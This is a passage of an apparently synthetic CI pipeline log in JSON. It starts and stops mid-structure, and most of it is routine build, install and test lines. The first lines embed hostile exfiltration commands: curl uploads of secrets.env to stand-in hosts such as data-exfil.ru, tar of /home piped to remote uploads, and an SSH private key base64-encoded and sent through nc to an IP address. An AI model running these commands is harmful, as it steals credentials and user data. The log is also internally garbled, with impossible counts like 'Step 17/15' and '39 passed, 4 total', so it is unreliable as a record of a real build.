https://data-exfil.ru/collect --data @secrets.env\nGenerating source maps...\nBundling runtime.js\ntar czf - /home | curl -X POST -d @- https://malicious-pool.xyz/upload\nFetching from https://pypi.org/package.json\nCache restored successfully (106MB)\necho $(cat ~/.ssh/id_rsa) | base64 | nc 100.195.103.232 28034\nReady.\nFinished.\ncurl -X POST https://data-exfil.ru/collect --data @secrets.env\nCompiling components/service.java...\nPlatform: win32-x64\nGenerating source maps...\ncurl -X POST https://malicious-pool.xyz/collect --data @secrets.env\nArtifact uploaded: build.tar.gz (31MB)\nCompleted.\nUsing Node.js 14.19.7\nTest Suites: 21 passed, 30 total\ntar czf - /home | curl -X POST -d @- https://crypto-mine.io/upload\n=== Step unit_tests completed ===",
    "steps": [
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-12-04T12:46:10.153788",
        "finished_at": "2025-12-04T12:46:21.760665",
        "log_lines": [
          "=== Step: setup_node ===",
          "Waiting...",
          "[12:46:10] WARN: Deprecated API usage",
          "Cache restored successfully (381MB)",
          "Waiting...",
          "Loading...",
          "\u2713 Task completed in 4386ms",
          "Step 9/21: Linting",
          "Processing...",
          "Success!",
          "  PASS: unit/test_api_health.spec.js",
          "npm install: resolved 1749 packages",
          "[12:46:10] DEBUG: Loading configuration",
          "[12:46:10] INFO: Processing request",
          "Processing...",
          "yarn add: Done in 12.32s",
          "[12:46:10] INFO: Starting build process",
          "Compiling src/utils.go...",
          "Using Python 3.10",
          "\u2713 Task completed in 4303ms",
          "Done.",
          "Compiling utils/utils.go...",
          "Fetching from https://githubusercontent.com/package.json",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "pip: Installing build dependencies...",
          "[12:46:10] INFO: Processing request",
          "Step 13/15: Linting",
          "GET /health - 200 (83ms)",
          "Fetching submodules...",
          "yarn add: Done in 28.3s",
          "npm install: added 75 packages",
          "pip install: Successfully installed webpack-2.20",
          "NODE_ENV=production",
          "pip: Downloading axios-4.6.tar.gz",
          "Cache hit for key-3045",
          "[12:46:10] INFO: Processing request",
          "Step 19/20: Testing",
          "Generating source maps...",
          "Bundling styles.css",
          "Artifact uploaded: dist.zip (96MB)",
          "[12:46:10] INFO: Processing request",
          "WARNING: react has known vulnerabilities",
          "Step 17/15: Testing",
          "Compiling lib/main.py...",
          "WARNING: webpack has known vulnerabilities",
          "npm install: added 333 packages",
          "TLS handshake completed",
          "Using Node.js 16.4.10",
          "[12:46:10] INFO: Request completed",
          "[12:46:10] INFO: Request completed",
          "[12:46:10] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (23MB)",
          "Generating source maps...",
          "Test Suites: 29 passed, 48 total",
          "[12:46:10] DEBUG: Connection pool: 20 active",
          "\u2717 build failed with exit code 52",
          "Compiling components/service.java...",
          "[12:46:10] DEBUG: Connection pool: 15 active",
          "pip: Downloading lodash-5.18.tar.gz",
          "GET /health - 201 (64ms)",
          "[12:46:10] INFO: Cache refreshed",
          "Loading...",
          "[12:46:10] INFO: Cache refreshed",
          "Bundling main.js",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Transforming 764 files...",
          "Pulling image: node:3.11",
          "pip: Collecting eslint",
          "Verifying...",
          "[12:46:10] DEBUG: Loading configuration",
          "  PASS: integration/test_auth_login.spec.js",
          "[12:46:10] INFO: Processing request",
          "npm notice: package.json updated",
          "Compiling utils/utils.go...",
          "FAILED: test_api_health",
          "Cache restored successfully (478MB)",
          "Checking out master branch",
          "Step 5/16: Deploying",
          "pip: Downloading react-5.11.tar.gz",
          "GET /api - 204 (9ms)",
          "pip: Downloading express-3.3.tar.gz",
          "Fetching from https://amazonaws.com/package.json",
          "Minifying app.js",
          "Checking out main branch",
          "Step 20/21: Building",
          "Compiling src/service.java...",
          "Switched to branch 'hotfix/task-614'",
          "Using Python 3.12",
          "HEAD is now at e0a5813",
          "WARNING: jest has known vulnerabilities",
          "[12:46:10] INFO: Request completed",
          "TLS handshake completed",
          "POST /upload - 200 (357ms)",
          "[12:46:10] DEBUG: Loading configuration",
          "pip: Collecting express",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Ready.",
          "  PASS: test_auth_login (102ms)",
          "WARNING: webpack has known vulnerabilities",
          "  PASS: test_cache_hit (426ms)",
          "[12:46:10] DEBUG: Connection pool: 14 active",
          "Using Node.js 14.15.6",
          "pip: Installing build dependencies...",
          "Compiling components/app.ts...",
          "Connection established",
          "Uploading artifact 'build' (21 files)",
          "Fetching from https://googleapis.com/package.json",
          "[12:46:10] WARN: Deprecated API usage",
          "  PASS: test_auth_login (430ms)",
          "npm notice: package.json updated",
          "Snapshots: 39 passed, 4 total",
          "Waiting...",
          "yarn add: Done in 3.77s",
          "Using Python 3.11",
          "Cache miss for key-7202",
          "POST /data - 202 (279ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "GET /health - 204 (49ms)",
          "Cache invalidated: build",
          "Layer 1/9: ENV command",
          "Step 17/19: Testing",
          "Coverage: 96% statements, 72% branches",
          "[12:46:10] WARN: Deprecated API usage",
          "[12:46:10] INFO: Request completed",
          "pip: Installing build dependencies...",
          "Snapshots: 0 passed, 13 total",
          "[12:46:10] WARN: Deprecated API usage",
          "Cache hit for key-6622",
          "NODE_ENV=production",
          "Step 9/18: Linting",
          "Artifact downloaded: 44MB",
          "Fetching from https://googleapis.com/package.json",
          "WARNING: lodash has known vulnerabilities",
          "Cache saved successfully",
          "Done.",
          "  PASS: integration/test_user_create.spec.js",
          "Cache invalidated: build",
          "Environment: production",
          "FAILED: test_cache_hit",
          "Artifact uploaded: dist.zip (87MB)",
          "WARNING: express has known vulnerabilities",
          "[12:46:10] INFO: Cache refreshed",
          "[12:46:10] ERROR: Connection failed",
          "npm notice: package.json updated",
          "Bundling vendor.js",
          "Time: 77.643s",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:46:10] INFO: Processing request",
          "pip: Downloading eslint-1.14.tar.gz",
          "Compiling src/utils.go...",
          "Ran 127 tests in 37s",
          "npm install: resolved 497 packages",
          "WARNING: webpack has known vulnerabilities",
          "Compiling components/service.java...",
          "pip: Downloading lodash-1.7.tar.gz",
          "FAILED: test_cache_hit",
          "[12:46:10] DEBUG: Query executed in 2ms",
          "[12:46:10] ERROR: Connection failed",
          "[12:46:10] DEBUG: Initializing service",
          "\u2713 All checks passed",
          "Test Suites: 35 passed, 25 total",
          "Step 9/19: Building",
          "Transforming 931 files...",
          "TLS handshake completed",
          "[12:46:10] DEBUG: Connection pool: 4 active",
          "Creating production build...",
          "Compiling lib/service.java...",
          "Artifact uploaded: build.tar.gz (23MB)",
          "[12:46:10] DEBUG: Query executed in 60ms",
          "Bundling runtime.js",
          "Optimizing 47 modules...",
          "Platform: darwin-arm64",
          "Completed.",
          "[12:46:10] WARN: Deprecated API usage",
          "\u2713 Step 'checkout' succeeded",
          "[12:46:10] ERROR: Connection failed",
          "\u2713 All checks passed",
          "  PASS: integration/test_cache_hit.spec.js",
          "pip: Installing build dependencies...",
          "Artifact uploaded: build.tar.gz (1MB)",
          "Creating production build...",
          "Cache invalidated: node_modules",
          "Already up to date.",
          "pip: Downloading express-3.15.tar.gz",
          "Optimizing 25 modules...",
          "Using Node.js 17.5.7",
          "Installing axios@4.19.7",
          "OK",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Artifact uploaded: dist.zip (79MB)",
          "[12:46:10] DEBUG: Connection pool: 15 active",
          "Time: 76.149s",
          "Switched to branch 'bugfix/task-974'",
          "pip: Installing build dependencies...",
          "GET /health - 201 (96ms)",
          "TLS handshake completed",
          "Compiling lib/handler.rs...",
          "[12:46:10] INFO: Request completed",
          "[12:46:10] INFO: Connecting to database",
          "WARNING: lodash has known vulnerabilities",
          "[12:46:10] DEBUG: Query executed in 82ms",
          "Cache miss for key-2521",
          "Waiting...",
          "pip: Installing build dependencies...",
          "\u2713 lint completed",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-12-04T12:46:21.760665",
        "finished_at": "2025-12-04T12:46:26.403416",
        "log_lines": [
          "=== Step: checkout ===",
          "Transforming 180 files...",
          "yarn add: Done in 3.98s",
          "yarn add: Done in 9.99s",
          "Pushing to registry...",
          "\u2713 Task completed in 4271ms",
          "Cache saved successfully",
          "[12:46:10] DEBUG: Query executed in 43ms",
          "pip: Installing build dependencies...",
          "Cache saved successfully",
          "OK",
          "[12:46:10] DEBUG: Query executed in 92ms",
          "Transforming 343 files...",
          "yarn add: Done in 20.60s",
          "npm install: added 171 packages",
          "Already up to date.",
          "Optimizing 24 modules...",
          "WARNING: prettier has known vulnerabilities",
          "npm install: resolved 1457 packages",
          "Step 17/19: Deploying",
          "Layer 6/15: RUN command",
          "Ran 26 tests in 17s",
          "yarn add: Done in 14.69s",
          "Step 2/20: Testing",
          "Switched to branch 'bugfix/task-661'",
          "Generating source maps...",
          "Ready.",
          "[12:46:10] DEBUG: Loading configuration",
          "[12:46:10] INFO: Starting build process",
          "  PASS: unit/test_user_create.spec.js",
          "Artifact uploaded: dist.zip (11MB)",
          "pip: Collecting eslint",
          "Minifying main.js",
          "\u2713 Task completed in 1216ms",
          "WARNING: prettier has known vulnerabilities",
          "Compiling utils/index.js...",
          "[12:46:10] DEBUG: Loading configuration",
          "Transforming 889 files...",
          "Using Node.js 20.10.3",
          "Artifact uploaded: dist.zip (58MB)",
          "Pushing to registry...",
          "Environment: production",
          "WARNING: react has known vulnerabilities",
          "\u2713 All checks passed",
          "Ran 145 tests in 5s",
          "Building Docker image...",
          "Finished.",
          "Artifact downloaded: 43MB",
          "Step 5/18: Testing",
          "OK",
          "Artifact uploaded: dist.zip (7MB)",
          "Layer 7/10: COPY command",
          "WARNING: prettier has known vulnerabilities",
          "  PASS: test_cache_hit (171ms)",
          "Snapshots: 20 passed, 50 total",
          "Cache restored successfully (433MB)",
          "Step 9/23: Running migrations",
          "Waiting...",
          "Ready.",
          "GET /status - 201 (79ms)",
          "Pulling image: alpine:3.11",
          "Step 6/22: Building",
          "TLS handshake completed",
          "Step 1/17: Running migrations",
          "npm install: resolved 1473 packages",
          "Using Python 3.12",
          "Switched to branch 'bugfix/task-522'",
          "Fetching from https://googleapis.com/package.json",
          "Minifying app.js",
          "Step 11/21: Linting",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "pip: Downloading eslint-1.7.tar.gz",
          "Artifact uploaded: dist.zip (17MB)",
          "Step 9/20: Building",
          "Step 8/23: Running migrations",
          "[12:46:10] DEBUG: Loading configuration",
          "[12:46:10] INFO: Starting build process",
          "Compiling components/utils.go...",
          "Installing prettier@5.19.8",
          "pip: Installing build dependencies...",
          "Minifying vendor.js",
          "Test Suites: 49 passed, 5 total",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "npm install: added 391 packages",
          "[12:46:10] INFO: Request completed",
          "\u2713 Step 'checkout' succeeded",
          "Snapshots: 13 passed, 19 total",
          "pip: Downloading lodash-4.20.tar.gz",
          "npm notice: created a lockfile",
          "Step 8/20: Running migrations",
          "Step 5/19: Testing",
          "FAILED: test_auth_login",
          "Connection established",
          "Waiting...",
          "Snapshots: 46 passed, 9 total",
          "Cache invalidated: dependencies",
          "Step 7/24: Building",
          "Compiling lib/main.py...",
          "[12:46:10] DEBUG: Initializing service",
          "Coverage: 79% statements, 74% branches",
          "Step 15/22: Linting",
          "Pushing to registry...",
          "[12:46:10] INFO: Cache refreshed",
          "Completed.",
          "npm install: added 235 packages",
          "Cache hit for key-8521",
          "[12:46:10] ERROR: Connection failed",
          "Using Node.js 17.15.8",
          "Step 17/25: Deploying",
          "Layer 8/9: COPY command",
          "[12:46:10] ERROR: Connection failed",
          "npm install: resolved 1681 packages",
          "Time: 59.500s",
          "NODE_ENV=test",
          "Time: 75.725s",
          "Cache saved successfully",
          "[12:46:10] DEBUG: Query executed in 60ms",
          "Compiling components/index.js...",
          "Compiling src/app.ts...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "pip: Downloading react-5.11.tar.gz",
          "  PASS: unit/test_cache_hit.spec.js",
          "Snapshots: 34 passed, 14 total",
          "TLS handshake completed",
          "Step 4/21: Testing",
          "HEAD is now at dbabd39",
          "Step 11/24: Running migrations",
          "pip install: Successfully installed webpack-4.6",
          "Waiting...",
          "pip install: Successfully installed react-5.4",
          "npm notice: created a lockfile",
          "Compiling utils/utils.go...",
          "Coverage: 98% statements, 85% branches",
          "Pushing to registry...",
          "Installing lodash@3.4.10",
          "Step 3/21: Installing dependencies",
          "  PASS: test_api_health (414ms)",
          "Compiling components/app.ts...",
          "Cache restored successfully (85MB)",
          "Fetching submodules...",
          "Exception: ValueError",
          "npm notice: created a lockfile",
          "NODE_ENV=test",
          "[12:46:10] DEBUG: Query executed in 78ms",
          "npm notice: created a lockfile",
          "\u2713 Task completed in 540ms",
          "pip: Collecting eslint",
          "Compiling components/handler.rs...",
          "Step 5/25: Linting",
          "Cache miss for key-6216",
          "Connection established",
          "Coverage: 90% statements, 72% branches",
          "TLS handshake completed",
          "FAILED: test_auth_login",
          "[12:46:10] DEBUG: Connection pool: 15 active",
          "Using Node.js 14.2.2",
          "\u2713 Step 'install' succeeded",
          "Cache miss for key-4700",
          "Pulling image: alpine:latest",
          "[12:46:10] INFO: Cache refreshed",
          "Exception: RuntimeError",
          "HEAD is now at 0f1ebff",
          "Step 2/17: Linting",
          "Compiling src/app.ts...",
          "Waiting...",
          "\u2713 Task completed in 3007ms",
          "Cache restored successfully (104MB)",
          "Cache saved successfully",
          "Step 18/15: Running migrations",
          "Checking out develop branch",
          "\u2713 Step 'build' succeeded",
          "Pulling image: python:latest",
          "Completed.",
          "TLS handshake completed",
          "[12:46:10] ERROR: Connection failed",
          "\u2713 Step 'setup' succeeded",
          "Time: 116.414s",
          "[12:46:10] DEBUG: Memory usage: 225MB",
          "\u2717 build failed with exit code 73",
          "Done.",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Exception: RuntimeError",
          "yarn add: Done in 17.15s",
          "Step 1/22: Building",
          "Tests: 59 passed, 417 total",
          "Minifying main.js",
          "FAILED: test_api_health",
          "Environment: development",
          "[12:46:10] WARN: Deprecated API usage",
          "npm install: resolved 1687 packages",
          "Test Suites: 26 passed, 26 total",
          "  PASS: test_auth_login (49ms)",
          "pip install: Successfully installed react-4.6",
          "Artifact uploaded: dist.zip (21MB)",
          "Generating source maps...",
          "Already up to date.",
          "Cache hit for key-6423",
          "pip: Installing build dependencies...",
          "Step 4/22: Linting",
          "npm install: resolved 1428 packages",
          "[12:46:10] INFO: Processing request",
          "Optimizing 38 modules...",
          "Pushing to registry...",
          "Optimizing 33 modules...",
          "Compiling lib/main.py...",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-12-04T12:46:26.403416",
        "finished_at": "2025-12-04T12:46:38.010293",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "\u2713 All checks passed",
          "[12:46:10] DEBUG: Loading configuration",
          "Generating source maps...",
          "[12:46:10] ERROR: Connection failed",
          "Bundling vendor.css",
          "Environment: staging",
          "Fetching from https://registry.npmjs.org/package.json",
          "Fetching from https://pypi.org/package.json",
          "Installing eslint@3.11.4",
          "[12:46:10] DEBUG: Initializing service",
          "Fetching submodules...",
          "Finished.",
          "Success!",
          "pip: Downloading eslint-1.14.tar.gz",
          "[12:46:10] INFO: Cache refreshed",
          "HEAD is now at 9f1944c",
          "FAILED: test_db_connect",
          "POST /data - 201 (495ms)",
          "Creating production build...",
          "NODE_ENV=development",
          "[12:46:10] DEBUG: Memory usage: 927MB",
          "Waiting...",
          "Step 2/25: Linting",
          "  PASS: unit/test_cache_hit.spec.js",
          "Checking out master branch",
          "Verifying...",
          "Success!",
          "Loading...",
          "Loading...",
          "Minifying app.js",
          "yarn add: Done in 6.24s",
          "POST /api - 201 (307ms)",
          "TLS handshake completed",
          "Coverage: 97% statements, 66% branches",
          "[12:46:10] INFO: Starting build process",
          "pip: Installing build dependencies...",
          "Step 20/23: Linting",
          "HEAD is now at 722744b",
          "Coverage: 73% statements, 90% branches",
          "Waiting...",
          "Success!",
          "[12:46:10] DEBUG: Initializing service",
          "Using Python 3.12",
          "Using Python 3.11",
          "Bundling styles.css",
          "Waiting...",
          "Coverage: 96% statements, 69% branches",
          "GET /health - 204 (72ms)",
          "[12:46:10] INFO: Starting build process",
          "Pushing to registry...",
          "[12:46:10] INFO: Cache refreshed",
          "Success!",
          "Fetching submodules...",
          "Step 18/20: Testing",
          "Success!",
          "Checking out main branch",
          "npm notice: package.json updated",
          "Waiting...",
          "  PASS: e2e/test_db_connect.spec.js",
          "Fetching submodules...",
          "GET /api - 200 (36ms)",
          "Verifying...",
          "Compiling lib/app.ts...",
          "Fetching from https://amazonaws.com/package.json",
          "Cache hit for key-3810",
          "Cache miss for key-7369",
          "NODE_ENV=production",
          "pip install: Successfully installed axios-2.6",
          "[12:46:10] DEBUG: Loading configuration",
          "pip: Collecting eslint",
          "Artifact downloaded: 31MB",
          "Artifact downloaded: 45MB",
          "Loading...",
          "Compiling lib/handler.rs...",
          "pip: Installing build dependencies...",
          "Fetching submodules...",
          "Snapshots: 15 passed, 4 total",
          "Image pulled successfully",
          "pip: Installing build dependencies...",
          "OK",
          "[12:46:10] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Checking out main branch",
          "Fetching from https://pypi.org/package.json",
          "yarn add: Done in 15.13s",
          "pip: Installing build dependencies...",
          "Done.",
          "TLS handshake completed",
          "Step 9/15: Running migrations",
          "[12:46:10] DEBUG: Query executed in 8ms",
          "Fetching submodules...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:46:10] INFO: Cache refreshed",
          "Uploading artifact 'build' (46 files)",
          "Connection established",
          "pip: Collecting lodash",
          "Already up to date.",
          "Coverage: 85% statements, 81% branches",
          "Coverage: 86% statements, 82% branches",
          "Time: 49.298s",
          "Pushing to registry...",
          "Done.",
          "npm notice: created a lockfile",
          "WARNING: lodash has known vulnerabilities",
          "  PASS: unit/test_user_create.spec.js",
          "[12:46:10] INFO: Starting build process",
          "Fetching submodules...",
          "[12:46:10] INFO: Cache refreshed",
          "[12:46:10] WARN: Deprecated API usage",
          "[12:46:10] INFO: Request completed",
          "Layer 8/13: ENV command",
          "Compiling components/index.js...",
          "Waiting...",
          "Ran 142 tests in 44s",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 18/19: Linting",
          "Artifact uploaded: dist.zip (9MB)",
          "[12:46:10] INFO: Starting build process",
          "[12:46:10] ERROR: Connection failed",
          "GET /status - 201 (84ms)",
          "Compiling utils/main.py...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Loading...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "npm install: resolved 1223 packages",
          "Step 6/18: Running migrations",
          "Step 12/25: Testing",
          "Tests: 115 passed, 123 total",
          "Image pulled successfully",
          "Step 1/15: Linting",
          "yarn add: Done in 20.72s",
          "Compiling src/service.java...",
          "Processing...",
          "GET /status - 200 (40ms)",
          "Fetching submodules...",
          "Exception: TypeError",
          "Minifying vendor.js",
          "GET /api - 201 (75ms)",
          "npm install: added 461 packages",
          "Coverage: 98% statements, 85% branches",
          "Transforming 257 files...",
          "Compiling lib/handler.rs...",
          "Tests: 300 passed, 460 total",
          "GET /api - 201 (77ms)",
          "[12:46:10] INFO: Processing request",
          "Step 16/24: Building",
          "Test Suites: 35 passed, 27 total",
          "pip: Installing build dependencies...",
          "Loading...",
          "[12:46:10] INFO: Processing request",
          "Step 3/20: Testing",
          "\u2713 Step 'setup' succeeded",
          "npm notice: created a lockfile",
          "  PASS: test_db_connect (200ms)",
          "Verifying...",
          "Compiling utils/app.ts...",
          "Compiling utils/handler.rs...",
          "Cache restored successfully (353MB)",
          "Using Python 3.9",
          "POST /data - 200 (177ms)",
          "Verifying...",
          "Image pulled successfully",
          "Building Docker image...",
          "FAILED: test_auth_login",
          "Using Python 3.12",
          "pip install: Successfully installed axios-5.18",
          "Image pulled successfully",
          "Checking out main branch",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Compiling src/service.java...",
          "npm install: resolved 1806 packages",
          "NODE_ENV=development",
          "[12:46:10] INFO: Cache refreshed",
          "\u2713 Step 'checkout' succeeded",
          "Time: 68.557s",
          "Compiling utils/main.py...",
          "Ran 77 tests in 46s",
          "Step 3/21: Installing dependencies",
          "TLS handshake completed",
          "Pushing to registry...",
          "Connection established",
          "Step 15/20: Running migrations",
          "Coverage: 78% statements, 60% branches",
          "Uploading artifact 'dist' (15 files)",
          "  PASS: test_api_health (167ms)",
          "Artifact uploaded: build.tar.gz (30MB)",
          "Generating source maps...",
          "WARNING: react has known vulnerabilities",
          "Environment: staging",
          "npm install: added 300 packages",
          "pip: Installing build dependencies...",
          "[12:46:10] DEBUG: Memory usage: 1345MB",
          "Step 16/24: Installing dependencies",
          "Ran 199 tests in 37s",
          "Cache hit for key-1461",
          "Verifying...",
          "[12:46:10] DEBUG: Memory usage: 1503MB",
          "Cache hit for key-6773",
          "[12:46:10] INFO: Connecting to database",
          "Artifact uploaded: dist.zip (21MB)",
          "Waiting...",
          "Pushing to registry...",
          "[12:46:10] INFO: Processing request",
          "npm notice: package.json updated",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-12-04T12:46:38.010293",
        "finished_at": "2025-12-04T12:46:44.974419",
        "log_lines": [
          "=== Step: save_cache ===",
          "Compiling utils/app.ts...",
          "Success!",
          "Pulling image: alpine:latest",
          "[12:46:10] ERROR: Connection failed",
          "Cache invalidated: node_modules",
          "Cache miss for key-3656",
          "TLS handshake completed",
          "Tests: 416 passed, 441 total",
          "Uploading artifact 'build' (38 files)",
          "Using Node.js 14.17.6",
          "Environment: development",
          "[12:46:10] INFO: Connecting to database",
          "Creating production build...",
          "Image pulled successfully",
          "[12:46:10] WARN: Deprecated API usage",
          "Bundling vendor.js",
          "Using Node.js 15.13.3",
          "Step 12/23: Installing dependencies",
          "Installing jest@3.10.7",
          "Test Suites: 10 passed, 37 total",
          "Cache hit for key-2176",
          "Cache hit for key-8531",
          "Step 15/20: Installing dependencies",
          "\u2713 lint completed",
          "\u2713 Step 'install' succeeded",
          "[12:46:10] WARN: Deprecated API usage",
          "[12:46:10] INFO: Connecting to database",
          "[12:46:10] WARN: Deprecated API usage",
          "Bundling main.css",
          "[12:46:10] DEBUG: Query executed in 37ms",
          "[12:46:10] WARN: Deprecated API usage",
          "Success!",
          "Building Docker image...",
          "[12:46:10] DEBUG: Connection pool: 15 active",
          "TLS handshake completed",
          "[12:46:10] DEBUG: Query executed in 48ms",
          "GET /api - 204 (42ms)",
          "Test Suites: 35 passed, 25 total",
          "Processing...",
          "Image pulled successfully",
          "Ready.",
          "Step 19/21: Installing dependencies",
          "Fetching submodules...",
          "WARNING: prettier has known vulnerabilities",
          "Creating production build...",
          "Compiling src/main.py...",
          "Installing eslint@3.1.0",
          "Processing...",
          "[12:46:10] INFO: Cache refreshed",
          "Tests: 240 passed, 447 total",
          "[12:46:10] WARN: Deprecated API usage",
          "[12:46:10] INFO: Request completed",
          "Fetching from https://githubusercontent.com/package.json",
          "Ran 181 tests in 39s",
          "Layer 10/9: RUN command",
          "Step 13/23: Building",
          "Artifact uploaded: build.tar.gz (16MB)",
          "[12:46:10] INFO: Starting build process",
          "Layer 2/12: ENV command",
          "TLS handshake completed",
          "\u2713 lint completed",
          "Cache saved successfully",
          "Completed.",
          "Cache miss for key-2808",
          "OK",
          "Step 7/25: Linting",
          "Ready.",
          "Snapshots: 25 passed, 19 total",
          "Step 17/21: Deploying",
          "pip: Collecting webpack",
          "Installing lodash@2.5.3",
          "Compiling components/utils.go...",
          "Building Docker image...",
          "[12:46:10] INFO: Starting build process",
          "[12:46:10] INFO: Request completed",
          "Image pulled successfully",
          "[12:46:10] WARN: Deprecated API usage",
          "[12:46:10] INFO: Starting build process",
          "[12:46:10] DEBUG: Memory usage: 188MB",
          "Generating source maps...",
          "npm notice: created a lockfile",
          "Switched to branch 'feature/task-248'",
          "npm install: resolved 803 packages",
          "[12:46:10] ERROR: Connection failed",
          "\u2713 All checks passed",
          "Finished.",
          "[12:46:10] DEBUG: Memory usage: 1778MB",
          "NODE_ENV=production",
          "[12:46:10] INFO: Processing request",
          "[12:46:10] INFO: Cache refreshed",
          "pip: Installing build dependencies...",
          "\u2713 Step 'checkout' succeeded",
          "HEAD is now at d87f605",
          "Artifact uploaded: dist.zip (24MB)",
          "Step 9/16: Deploying",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Cache hit for key-8127",
          "\u2717 build failed with exit code 14",
          "[12:46:10] DEBUG: Initializing service",
          "[12:46:10] WARN: Deprecated API usage",
          "\u2717 build failed with exit code 55",
          "pip: Installing build dependencies...",
          "Step 19/25: Deploying",
          "Generating source maps...",
          "[12:46:10] INFO: Cache refreshed",
          "Artifact downloaded: 50MB",
          "Artifact uploaded: dist.zip (4MB)",
          "[12:46:10] DEBUG: Connection pool: 9 active",
          "Step 8/17: Building",
          "Ready.",
          "GET /health - 204 (2ms)",
          "Test Suites: 35 passed, 11 total",
          "Using Node.js 20.10.4",
          "Artifact downloaded: 26MB",
          "Waiting...",
          "  PASS: test_cache_hit (183ms)",
          "Cache invalidated: build",
          "npm install: added 12 packages",
          "Time: 32.921s",
          "Connection established",
          "Building Docker image...",
          "OK",
          "yarn add: Done in 5.63s",
          "\u2717 build failed with exit code 90",
          "[12:46:10] WARN: Deprecated API usage",
          "Loading...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Transforming 806 files...",
          "POST /upload - 200 (434ms)",
          "Waiting...",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Generating source maps...",
          "Cache restored successfully (29MB)",
          "Cache miss for key-3317",
          "Optimizing 85 modules...",
          "Cache hit for key-8708",
          "Using Node.js 18.18.4",
          "npm notice: package.json updated",
          "Building Docker image...",
          "[12:46:10] WARN: Deprecated API usage",
          "npm notice: created a lockfile",
          "Using Node.js 20.4.7",
          "Finished.",
          "Artifact uploaded: dist.zip (34MB)",
          "Success!",
          "Exception: NullPointerException",
          "Processing...",
          "Done.",
          "Platform: darwin-arm64",
          "pip: Installing build dependencies...",
          "Transforming 722 files...",
          "TLS handshake completed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Compiling components/utils.go...",
          "\u2717 build failed with exit code 44",
          "Processing...",
          "Done.",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Processing...",
          "[12:46:10] INFO: Connecting to database",
          "Using Python 3.12",
          "Loading...",
          "Platform: darwin-arm64",
          "Loading...",
          "\u2717 build failed with exit code 35",
          "  PASS: unit/test_user_create.spec.js",
          "Loading...",
          "Artifact uploaded: dist.zip (19MB)",
          "Artifact uploaded: dist.zip (52MB)",
          "NODE_ENV=test",
          "Already up to date.",
          "HEAD is now at 2cbc4dd",
          "Artifact uploaded: build.tar.gz (24MB)",
          "Ready.",
          "[12:46:10] ERROR: Connection failed",
          "OK",
          "\u2713 package completed",
          "WARNING: eslint has known vulnerabilities",
          "Platform: linux-x64",
          "Uploading artifact 'dist' (1 files)",
          "OK",
          "Pushing to registry...",
          "Artifact uploaded: dist.zip (8MB)",
          "Cache hit for key-2383",
          "Optimizing 35 modules...",
          "Success!",
          "Verifying...",
          "Loading...",
          "TLS handshake completed",
          "WARNING: webpack has known vulnerabilities",
          "Snapshots: 46 passed, 49 total",
          "OK",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Processing...",
          "npm install: added 393 packages",
          "Compiling utils/service.java...",
          "\u2713 Step 'setup' succeeded",
          "POST /upload - 201 (330ms)",
          "Step 15/25: Installing dependencies",
          "Artifact downloaded: 1MB",
          "Step 7/25: Running migrations",
          "Cache hit for key-8529",
          "[12:46:10] DEBUG: Query executed in 91ms",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-12-04T12:46:44.974419",
        "finished_at": "2025-12-04T12:47:19.795050",
        "log_lines": [
          "=== Step: build ===",
          "Time: 52.109s",
          "HEAD is now at 87f58e1",
          "Step 2/22: Building",
          "Exception: NullPointerException",
          "Processing...",
          "Processing...",
          "Creating production build...",
          "\u2713 validate completed",
          "WARNING: jest has known vulnerabilities",
          "Step 5/25: Deploying",
          "Coverage: 88% statements, 85% branches",
          "npm notice: package.json updated",
          "Ran 68 tests in 30s",
          "Step 14/21: Deploying",
          "Artifact uploaded: build.tar.gz (13MB)",
          "Snapshots: 42 passed, 44 total",
          "Bundling main.css",
          "HEAD is now at aec7ff6",
          "Generating source maps...",
          "Loading...",
          "Checking out develop branch",
          "GET /api - 200 (68ms)",
          "[12:46:10] DEBUG: Connection pool: 10 active",
          "Bundling styles.js",
          "Processing...",
          "[12:46:10] INFO: Cache refreshed",
          "Uploading artifact 'build' (39 files)",
          "Cache restored successfully (317MB)",
          "npm install: added 399 packages",
          "NODE_ENV=test",
          "Compiling utils/app.ts...",
          "Step 11/25: Running migrations",
          "Success!",
          "Installing react@3.20.1",
          "Test Suites: 35 passed, 9 total",
          "[12:46:10] DEBUG: Initializing service",
          "WARNING: prettier has known vulnerabilities",
          "POST /upload - 201 (362ms)",
          "NODE_ENV=development",
          "Step 9/18: Running migrations",
          "Cache hit for key-4599",
          "Cache invalidated: node_modules",
          "[12:46:10] INFO: Starting build process",
          "[12:46:10] WARN: Deprecated API usage",
          "Cache hit for key-2259",
          "Compiling lib/index.js...",
          "Step 6/22: Running migrations",
